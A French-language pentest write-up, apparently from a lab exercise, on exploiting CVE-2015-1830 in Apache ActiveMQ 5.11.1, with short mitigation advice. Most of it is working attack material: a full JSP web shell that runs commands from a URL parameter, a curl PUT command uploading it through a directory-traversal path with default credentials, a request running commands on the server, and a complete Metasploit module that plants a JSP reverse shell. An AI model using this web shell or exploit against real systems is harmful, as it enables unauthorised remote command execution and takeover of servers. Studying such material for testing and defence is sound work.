## Version ActiveMQ

Une fois que vous avez accèder au site via l'URL, vous pouvez voir la version comme sur l'image ci dessous :

→ version 5.11.1

<img width="1195" alt="ActiveMQ_2015" src="https://github.com/user-attachments/assets/6f04639c-0b52-4947-9f6d-77b0d21037c7">

## CVE 2015-1830

La CVE-2015-1830 est une vulnérabilité de sécurité dans Apache ActiveMQ qui permet à un attaquant de contourner l'authentification et d'accéder à des fonctionnalités administratives, potentiellement compromettant les données et la configuration du système.

<img width="1041" alt="Capture d’écran 2024-10-30 à 21 02 34" src="https://github.com/user-attachments/assets/878cf608-cc90-41d9-b119-6458798c614b">


**Mitigation**

Pour atténuer les risques liés aux vulnérabilités de sécurité identifiées dans Apache ActiveMQ, il est recommandé de :

1. **Mettre à jour Apache ActiveMQ** :  
   Mettez à jour votre installation vers la version **5.12.0** ou **5.11.2**. Ces versions contiennent des correctifs de sécurité.
   
3. **Désactiver le fileserver (si non utilisé)** :  
   Si vous ne pouvez pas mettre à jour immédiatement, et si la fonctionnalité de **fileserver** n'est pas utilisée, vous pouvez désactiver cette fonctionnalité en commentant les lignes pertinentes dans le fichier de configuration `jetty.xml`. 


## Stratégie de compromission

Dans cette stratégie, nous exploitons une instance d’ActiveMQ accessible sur le port 8161 pour exécuter des commandes à distance. 

### Étapes d’exploitation

1. **Accéder à l’interface d’administration :**
   - Naviguer vers `http://TARGET:8161/admin` et se connecter avec les identifiants par défaut d’ActiveMQ -> comme dans le README
  
2. **Téléverser un fichier malveillant :**
   - Créer un fichier `inveteck.jsp` qui permet d’exécuter des commandes en ligne.

     Vous retrouverez ci-dessous un exemple :

   ```bash
   $ cat inveteck.jsp
   <%@ page import="java.util.*,java.io.*"%>  
    <%  
    %>  
    <HTML><BODY>  
    Commands with JSP  
    <FORM METHOD="GET" NAME="myform" ACTION="">  
    <INPUT TYPE="text" NAME="attack">  
    <INPUT TYPE="submit" VALUE="Send">  
    </FORM>  
    <pre>  
    <%  
    if (request.getParameter("attack") != null) {  
    out.println("Command: " + request.getParameter("attack") + "<BR>");  
    Process p = Runtime.getRuntime().exec(request.getParameter("attack"));  
    OutputStream os = p.getOutputStream();  
    InputStream in = p.getInputStream();  
    DataInputStream dis = new DataInputStream(in);  
    String disr = dis.readLine();  
    while ( disr != null ) {  
    out.println(disr);  
    disr = dis.readLine();  
    }  
    }  
    %>  
    </pre>  
    </BODY></HTML>
   ```
   
   - Utiliser `curl` pour téléverser ce fichier sur le serveur avec une commande PUT :
     ```bash
     curl -u 'username:password' -v -X PUT --data-binary "@inveteck.jsp" http://TARGET:8161/fileserver/..\\admin\\inveteck.jsp
     ```

2. **Exécuter des commandes via Burp Suite :**
   - Capturer la requête et l’envoyer au Repeater dans Burp Suite en jsp.
   - Accéder au fichier `inveteck.jsp` en ajoutant un paramètre pour exécuter une commande, par exemple :
     ```
     GET /fileserver/../admin/inveteck.jsp?attack=ipconfig
     ```

      Cette étape nous permet de vérifier que le serveur exécute nos commandes à distance, ouvrant la voie à d'autres actions en               fonction de l'objectif de l'attaque ou du test de sécurité.
     
   - Envoyer la requête et récupérer l’adresse IP et d’autres informations du serveur cible.


Ou encore 

Ce code est un module d'exploitation pour Metasploit qui cible une vulnérabilité dans Apache ActiveMQ (CVE-2015-1830). Cette vulnérabilité permet un contournement d'authentification par parcours de répertoire et le téléversement de fichiers JSP dans des versions vulnérables d’ActiveMQ (versions 5.x à 5.11.1). Le module essaie d’installer un shell JSP sur le serveur pour obtenir un accès à distance.

```bash
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache
        ActiveMQ 5.x before 5.11.2 for Windows.

        The module tries to upload a JSP payload to the /admin directory via the traversal
        path /fileserver/..\\admin\\ using an HTTP PUT request with the default ActiveMQ
        credentials admin:admin (or other credentials provided by the user). It then issues
        an HTTP GET request to /admin/<payload>.jsp on the target in order to trigger the
        payload and obtain a shell.
      },
      'Author'          =>
        [
          'David Jorm',     # Discovery and exploit
          'Erik Wynter'     # @wyntererik - Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2015-1830' ],
          [ 'EDB', '40857'],
          [ 'URL', 'https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt' ]
        ],
      'Privileged'     => false,
      'Platform'    => %w{ win },
      'Targets'     =>
        [
          [ 'Windows Java',
            {
              'Arch' => ARCH_JAVA,
              'Platform' => 'win'
            }
          ],
        ],
      'DisclosureDate' => '2015-08-19',
      'License'        => MSF_LICENSE,
      'DefaultOptions'  => {
        'RPORT' => 8161,
        'PAYLOAD' => 'java/jsp_shell_reverse_tcp'
        },
      'DefaultTarget'  => 0))

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),
      OptString.new('PATH',      [true, 'Traversal path', '/fileserver/..\\admin\\']),
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin'])
    ])
  end

  def check
    print_status("Running check...")
    testfile = Rex::Text::rand_text_alpha(10)
    testcontent = Rex::Text::rand_text_alpha(10)

    send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, datastore['PATH'], "#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        },
      'method'    => 'PUT',
      'data'      => "<% out.println(\"#{testcontent}\");%>"
    })

    res1 = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        },
      'method'    => 'GET'
    })

    if res1 && res1.body.include?(testcontent)
      send_request_cgi(
        opts = {
          'uri'       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
          'headers'     => {
            'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
            },
          'method'    => 'DELETE'
        },
        timeout = 1
      )
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Uploading payload...")
    testfile = Rex::Text::rand_text_alpha(10)
    vprint_status("If upload succeeds, payload will be available at #{target_uri.path}admin/#{testfile}.jsp") #This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails.

    send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, datastore['PATH'], "#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        },
      'method'    => 'PUT',
      'data'      => payload.encoded
    })

    print_status("Payload sent. Attempting to execute the payload.")
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
      },
      'method'    => 'GET'
    })
    if res && res.code == 200
      print_good("Payload executed!")
    else
      fail_with(Failure::PayloadFailed, "Failed to execute the payload")
    end
  end
end
```          
